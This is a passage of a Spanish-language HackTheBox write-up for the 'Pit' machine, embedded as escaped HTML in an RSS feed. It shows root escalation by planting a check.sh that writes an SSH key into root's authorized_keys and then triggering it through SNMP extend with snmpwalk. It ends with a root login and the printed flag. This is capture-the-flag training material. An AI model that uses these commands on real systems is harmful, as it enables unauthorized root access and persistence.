&lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
    /bin/bash &lt;span class=&#34;nv&#34;&gt;$script&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;michelle@pit ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$ ls -lah /usr/local/monitoring/
ls: cannot open directory &lt;span class=&#34;s1&#34;&gt;&amp;#39;/usr/local/monitoring/&amp;#39;&lt;/span&gt;: Permission denied
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;michelle@pit ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$ ls -lah /usr/local&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep monitoring
drwxrwx---+  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;122&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 17:10 monitoring
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;michelle@pit ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$ getfacl /usr/local/monitoring/
getfacl: Removing leading &lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; from absolute path names
&lt;span class=&#34;c1&#34;&gt;# file: usr/local/monitoring/&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# owner: root&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# group: root&lt;/span&gt;
user::rwx
user:michelle:-wx
group::rwx
mask::rwx
other::---

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;michelle@pit ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;shell&#34;&gt;Shell&lt;/h2&gt;
&lt;p&gt;Tomamos en cuenta que el unico usuario que ejeucta este script es root, agregamos un archivo a la carpeta &lt;code&gt;/usr/local/monitoring/&lt;/code&gt; con el nombre &lt;code&gt;check.sh&lt;/code&gt; el cual contiene un comando para agregar la clave de SSH de michelle al archivo &lt;code&gt;authorized_keys&lt;/code&gt; del usuario root.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# echo &amp;#34;echo &amp;#39;ssh-rsa AAAAB3[...]8cTIs= michelle@pit.htb&amp;#39; &amp;gt; /root/.ssh/authorized_keys&amp;#34; &amp;gt; /usr/local/monitoring/check.sh&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;michelle@pit ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$ &amp;lt;CdJKfC/TvFbs/q+Nuq41ULJNERZ19qIyxCshQtisKwFY2If8&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; kali@kali&lt;span class=&#34;s1&#34;&gt;&amp;#39; &amp;gt; /root/.ssh/authorized_keys&amp;#34; &amp;gt; /usr/local/monitoring/check.sh
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[michelle@pit ~]$ cat /usr/local/monitoring/check.sh
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;echo &amp;#39;&lt;/span&gt;ssh-rsa AAAAB3&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;8cTIs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; michelle@pit.htb&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; &amp;gt; /root/.ssh/authorized_keys
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;michelle@pit ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Para que el comando se ejecute realizamos la ejecucion de &lt;code&gt;snmpwalk&lt;/code&gt; (&lt;a href=&#34;https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/&#34;&gt;1&lt;/a&gt;)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;π ~/htb/pit ❯ snmpwalk -v 2c -c public pit.htb NET-SNMP-EXTEND-MIB::nsExtendObjects&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;tail -n &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Luego de la ejecucion de snmpwalk utilizamos ssh para cambiar al usuario root, con lo cual obtenemos la flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;michelle@pit ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$ ssh root@localhost
The authenticity of host &lt;span class=&#34;s1&#34;&gt;&amp;#39;localhost (::1)&amp;#39;&lt;/span&gt; can&lt;span class=&#34;s1&#34;&gt;&amp;#39;t be established.
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;ECDSA key fingerprint is SHA256:N07IT3fGYgOB1uKAL/kctwXiIXEDS6kmuNno6+6uQts.
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Warning: Permanently added &amp;#39;&lt;/span&gt;localhost&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to the list of known hosts.
Web console: https://pit.htb:9090/

Last login: Mon May &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 11:42:46 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;root@pit ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# whoami&lt;/span&gt;
root
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;root@pit ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# ll&lt;/span&gt;
total &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt;
-rwx------. &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;706&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; cleanup.sh
drwx------. &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;122&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; monitoring
lrwxrwxrwx. &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root   &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 11:07 null -&amp;gt; /dev/null
-r--------. &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root  &lt;span class=&#34;m&#34;&gt;33&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 14:46 root.txt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;root@pit ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# cat root.txt&lt;/span&gt;
2df6f7423ddcef30093a07cdee9fdcc1
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;root@pit ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/pit/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/pit/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>cockpit</category>
            
          
            
              <category>snmp</category>
            
          
            
              <category>SeeDMS</category>
            
          
            
              <category>centOS</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>